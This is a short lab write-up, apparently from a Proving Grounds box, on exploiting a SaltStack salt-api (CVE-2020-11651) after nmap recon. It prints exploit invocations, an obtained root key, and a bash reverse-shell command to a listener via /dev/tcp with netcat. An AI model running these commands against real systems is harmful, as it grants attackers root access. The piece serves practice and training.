# Recon

I do my initial scan to see which ports and services are open.

## nmapAutomator.sh Full
```
$ sudo ./nmapAutomator.sh -H twiggy.pg -t Full -o full

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-title: Home | Mezzanine
|_http-server-header: nginx/1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-title: Site doesn't have a title (application/json).
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.16.1
```

# Enumeration

## Port 8000 - nginx 1.16.1

`curl`'ing this service shows an `X-Upstream:` header set to `salt-api/3000-1`

![curl-salt-resp.png](../_resources/curl-salt-resp.png)

Checking `searchsploit` we see that there appears to be an exploit for this version.

# Exploit

I end up Googling around and test driving different exploits on GitHub, eventually settling for this one:

https://github.com/jasperla/CVE-2020-11651-poc
![373e815aa520362e3a9cfc7031aec68f.png](../_resources/373e815aa520362e3a9cfc7031aec68f.png)

`root key obtained: sxZXn5kSJ8GhLjvneaBPMAoMlbqbUNuZ2drFuheYR8r/goL8Iij0bGn7at8vI4Md1I5ESLm3+aw`

![03fdfcb00ca1d33a1fe5deb09d5677c1.png](../_resources/03fdfcb00ca1d33a1fe5deb09d5677c1.png)

`python3 exploit.py --master 192.168.70.62 --exec "ping 192.168.49.70"`

![b04030ace7803b85e7ed4c8282765e7c.png](../_resources/b04030ace7803b85e7ed4c8282765e7c.png)

`sudo tcpdump -i tun0 icmp`

![ffe57665d08820b789f52ad0d24b2996.png](../_resources/ffe57665d08820b789f52ad0d24b2996.png)

`python3 exploit.py --master 192.168.70.62 --exec "bash -i >& /dev/tcp/192.168.49.70/80 0>&1"`

![f59d31cd3ee31ca4dc9a76a562e168e8.png](../_resources/f59d31cd3ee31ca4dc9a76a562e168e8.png)

`sudo nc -nlvp 80`

We are root!

![ce6704036c74e5cab812198a9fccf58e.png](../_resources/ce6704036c74e5cab812198a9fccf58e.png)